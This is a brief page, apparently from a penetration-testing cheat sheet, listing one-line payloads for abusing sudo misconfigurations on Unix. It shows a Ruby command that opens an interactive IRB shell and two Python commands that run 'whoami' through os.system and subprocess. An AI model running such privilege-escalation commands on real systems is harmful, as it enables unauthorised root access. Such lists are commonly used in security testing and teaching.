---
description: >-
  This page contains payloads that can be used to abuse sudo misconfigurations
  on a Unix-based system.
---

# Misconfigurations

Ruby

```
/usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
```

Python

```
/usr/bin/python -c 'import os;os.system("whoami")'
```

```
/usr/bin/python -c 'from subprocess import call;call("[whoami]")'
```
